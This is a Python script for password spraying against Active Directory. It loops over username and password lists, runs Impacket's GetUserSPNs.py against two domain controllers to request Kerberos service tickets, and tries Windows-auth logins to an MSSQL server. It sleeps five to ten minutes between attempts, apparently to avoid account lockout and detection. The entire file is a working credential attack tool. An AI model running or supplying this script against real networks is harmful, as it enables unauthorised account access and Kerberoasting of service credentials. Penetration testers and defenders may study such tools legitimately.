import subprocess
import time
import random
from pathlib import Path

# ========== Configuration ==========
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
output_file = "spray_output.txt"

kerberos_targets = ["192.168.1.2", "192.168.1.24"]
mssql_target = "192.168.1.22"
domain = <placeholder>

min_delay = 300  # 5 minutes
max_delay = 600  # 10 minutes
# ===================================

def log_result(tool_name, user, password, output):
    with open(output_file, "a") as f:
        f.write(f"[{tool_name}] {user}:{password}\n{output}\n{'='*50}\n")

def run_kerberos(user, password):
    for dc in kerberos_targets:
        try:
            command = [
                "GetUserSPNs.py",
                f"{domain}/{user}:{password}",
                f"-dc-ip", dc
            ]
            result = subprocess.run(command, capture_output=True, text=True, timeout=60)
            log_result(f"Kerberos@{dc}", user, password, result.stdout + result.stderr)
        except Exception as e:
            log_result(f"Kerberos@{dc}", user, password, f"Error: {str(e)}")

def run_mssql(user, password):
    try:
        command = [
            "mssqlclient.py",
            f"{domain}/{user}:{password}@{mssql_target}",
            "-windows-auth"
        ]
        result = subprocess.run(command, capture_output=True, text=True, timeout=60)
        log_result(f"MSSQL@{mssql_target}", user, password, result.stdout + result.stderr)
    except Exception as e:
        log_result(f"MSSQL@{mssql_target}", user, password, f"Error: {str(e)}")

def main():
    if not Path(usernames_file).exists() or not Path(passwords_file).exists():
        print("Username or password file not found.")
        return

    with open(usernames_file, "r") as uf, open(passwords_file, "r") as pf:
        usernames = [u.strip() for u in uf if u.strip()]
        passwords = [p.strip() for p in pf if p.strip()]

    for password in passwords:
        for user in usernames:
            print(f"[*] Trying {user}:{password}")
            run_kerberos(user, password)
            run_mssql(user, password)

            sleep_time = random.randint(min_delay, max_delay)
            print(f"[+] Sleeping for {sleep_time // 60} minutes...")
            time.sleep(sleep_time)

if __name__ == "__main__":
    main()
